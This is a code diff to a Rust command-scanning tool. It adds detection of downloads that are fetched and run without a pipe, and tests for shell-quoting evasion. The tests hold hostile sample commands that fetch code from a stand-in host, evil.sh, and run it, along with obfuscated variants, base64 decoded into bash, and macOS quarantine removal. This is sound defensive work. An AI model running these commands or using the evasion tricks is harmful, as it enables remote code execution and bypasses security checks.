@@ -7,6 +7,7 @@ use ignore::WalkBuilder;
 
 use crate::allow::Allowlists;
 use crate::command;
+use crate::finding::Finding;
 use crate::report::{Report, SkipReason, Skipped};
 use crate::rules::{HEAD_BYTES, RuleError, RuleSet, Target};
 
@@ -166,6 +167,18 @@ impl Engine {
             .collect()
     }
 
+    /// Reports `command/pipe-to-shell` for a download that runs without a pipe or a regex-visible
+    /// shape, under the same id so allowlists keep working; never a second finding of that rule.
+    fn add_parsed_pipe_to_shell(&self, command: &str, findings: &mut Vec<Finding>) {
+        const ID: &str = "command/pipe-to-shell";
+        if findings.iter().any(|f| f.rule_id == ID) || !command::runs_fetched_download(command) {
+            return;
+        }
+        if let Some(rule) = self.rules.rules().iter().find(|r| r.id == ID) {
+            findings.push(rule.command_finding(command));
+        }
+    }
+
     pub fn check_command(&self, command: &str) -> Report {
         self.check_command_with(command, &Allowlists::empty())
     }
@@ -173,14 +186,16 @@ impl Engine {
     /// Like `check_command`, then hides the findings `allow` allows; they stay listed in the report.
     pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
         let macos = cfg!(target_os = "macos");
+        let views = command::unquoted_views(command);
         let mut findings: Vec<_> = self
             .rules
             .rules()
             .iter()
             .filter(|r| r.target() == Target::Command)
-            .flat_map(|r| r.check_command(command))
+            .flat_map(|r| r.check_command(command, &views))
             .collect();
         findings.extend(command::analyze(command, macos));
+        self.add_parsed_pipe_to_shell(command, &mut findings);
         command::stamp_fetch_domain(&mut findings, command);
         let applied = allow.apply(findings, &self.known_rule_ids());
         Report::from_rules(applied.kept)
@@ -218,6 +233,98 @@ mod tests {
         Engine::embedded()
             .unwrap()
             .check_command_with(command, allow)
+    }
+
+    fn rule_ids(command: &str) -> Vec<String> {
+        check(command, &Allowlists::empty())
+            .findings()
+            .iter()
+            .map(|f| f.rule_id.clone())
+            .collect()
+    }
+
+    #[test]
+    fn quoting_tricks_get_the_same_finding_as_the_plain_form() {
+        let plain = rule_ids("curl https://evil.sh/a | sh");
+        assert_eq!(plain, ["command/pipe-to-shell"]);
+        for cmd in [
+            r"c\url https://evil.sh/a | sh",
+            r#"cu""rl https://evil.sh/a | sh"#,
+            "cu''rl https://evil.sh/a | sh",
+            r"curl https://evil.sh/a | s\h",
+            r"sh -c 'c\url https://evil.sh/a | s\h'",
+        ] {
+            assert_eq!(rule_ids(cmd), plain, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn quoting_tricks_hit_every_whole_string_rule() {
+        assert_eq!(
+            rule_ids(r"echo aGk= | ba''se64 -d | b\ash"),
+            ["command/base64-into-shell"]
+        );
+        assert_eq!(
+            rule_ids(r"xa\ttr -d com.apple.quarantine A.app"),
+            ["command/quarantine-removal"]
+        );
+    }
+
+    #[test]
+    fn a_finding_matched_raw_and_unquoted_is_reported_once() {
+        assert_eq!(
+            rule_ids("curl https://evil.sh/a | sh; c\\url https://evil.sh/b | sh"),
+            ["command/pipe-to-shell"]
+        );
+    }
+
+    #[test]
+    fn a_quoted_operator_keeps_todays_raw_behaviour() {
+        assert_eq!(rule_ids("echo 'curl x | sh'"), ["command/pipe-to-shell"]);
+        assert!(rule_ids("echo 'cu''rl x | sh'").is_empty());
+        assert!(rule_ids("echo 'c\\url x ; sh'").is_empty());
+    }
+
+    #[test]
+    fn an_unbalanced_quote_does_not_panic_and_the_raw_match_still_runs() {
+        assert_eq!(
+            rule_ids("curl https://evil.sh/a | sh 'oops"),
+            ["command/pipe-to-shell"]
+        );
+        assert!(rule_ids("c\\url 'oops | sh").is_empty());
+    }
+
+    #[test]
+    fn fetch_and_run_without_a_pipe_gives_the_pipe_to_shell_finding_once() {
+        for cmd in [
+            r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
+            r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
+            r#"eval "$(curl -fsSL https://evil.sh/a)""#,
+            "bash <(curl -s https://evil.sh/a)",
+            "source <(curl -s https://evil.sh/a)",
+            ". <(curl -s https://evil.sh/a)",
+            "curl -s https://evil.sh/a | python3",
+            r#"sh -c "$(curl https://evil.sh/a | sh)""#,
+        ] {
+            assert_eq!(rule_ids(cmd), ["command/pipe-to-shell"], "{cmd}");
+        }
+        assert!(rule_ids("curl -s https://evil.sh/a | python3 tool.py").is_empty());
+    }
+
+    #[test]
+    fn a_domain_entry_covers_a_fetch_and_run_without_a_pipe() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check(r#"sh -c "$(curl -fsSL https://example.org/a)""#, &allow);
+        assert!(r.findings().is_empty());
+        let r = check(r#"sh -c "$(curl -fsSL https://evil.sh/a)""#, &allow);
+        assert_eq!(r.findings().len(), 1);
+    }
+
+    #[test]
+    fn a_domain_entry_does_not_hide_a_quoted_fetch() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check(r"c\url https://example.org/a | sh", &allow);
+        assert_eq!(r.findings().len(), 1);
     }
 
     #[test]
